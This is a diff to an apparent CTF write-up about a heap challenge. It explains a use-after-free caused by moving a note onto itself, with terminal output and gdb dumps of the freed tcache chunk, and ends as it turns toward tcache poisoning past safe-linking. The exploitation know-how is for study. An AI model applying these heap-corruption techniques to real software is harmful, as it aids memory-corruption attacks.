@@ -128,7 +128,59 @@ Check address stored at `src` index != null
 --> Set address at `des` index to itself (or the address provided by malloc() ), set size to `src` size  
 
 ## Exploitation  
-There was a UAF bug in `copy()`, particularly in the last 2 steps  
-``` --> If it's a `move` then free the chunk at `src` and set the address stored at `src` index to 0 (prevent use-after-free)  
---> Set address at `des` index to itself (or the address provided by malloc() ), set size to `src` size  ```
+There was a UAF bug in `copy()`, particularly in the last 2 steps:  
+--> If it's a `move` then free the chunk at `src` and set the address stored at `src` index to 0 (prevent use-after-free)  
+--> Set address at `des` index to itself (or the address provided by malloc() ), set size to `src` size  
+The problems is when we `move` to itself. The chunk is freed, the address is set to 0 but after that, the address at `des` get set. But `src` = `des`, thus we have a UAF.  
+With this UAF, we can `show()` what stored in that chunk, and `copy()` to write to that chunk, after it was freed.  
+
+```console
+┌──(kali㉿kali)-[~/Desktop/pwn/crew/lambang]
+└─$ ./mynote_patched
+1. Alloc
+2. Show
+3. Move
+4. Copy
+> 1
+Index: 0
+Size: 10
+Content: AAAA
+1. Alloc
+2. Show
+3. Move
+4. Copy
+> 3
+Index (src): 0
+Index (dest): 0
+1. Alloc
+2. Show
+3. Move
+4. Copy
+> 2
+Index: 0
+�p^X
+1. Alloc
+2. Show
+3. Move
+4. Copy
+> 
+```  
+```console  
+0x555555558060 <notes>: 0x000055555555a2a0      0x000000000000000a
+0x555555558070 <notes+16>:      0x0000000000000000      0x0000000000000000
+0x555555558080 <notes+32>:      0x0000000000000000      0x0000000000000000
+0x555555558090 <notes+48>:      0x0000000000000000      0x0000000000000000
+0x5555555580a0 <notes+64>:      0x0000000000000000      0x0000000000000000
+```  
+The address is still there after freed  
+```console
+gef➤  x/10gx 0x000055555555a2a0 - 0x10
+0x55555555a290: 0x0000000000000000      0x0000000000000021
+0x55555555a2a0: 0x000000055555555a      0x000055555555a010
+0x55555555a2b0: 0x0000000000000000      0x0000000000020d51
+```  
+Now we can try to overwrite this freed chunk, which is a tcache bin. We can try tcache poisoning, overwrite the fd pointer at `0x55555555a2a0`. But because this was glibc 2.32, there is an additional mitigation, which is safe-linking.  
+You can read more about it here https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/
+
+
 
